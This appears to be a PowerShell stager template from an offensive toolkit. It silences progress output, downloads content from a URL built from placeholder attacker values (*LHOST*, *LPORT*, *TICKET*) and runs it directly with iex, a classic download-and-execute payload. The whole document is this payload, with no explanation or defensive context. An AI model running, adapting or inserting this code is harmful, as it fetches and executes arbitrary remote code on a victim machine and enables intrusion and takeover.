$ProgressPreference = 'SilentlyContinue'
$url = 'http://*LHOST*:*LPORT*/*TICKET*'
$src = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
iex $src
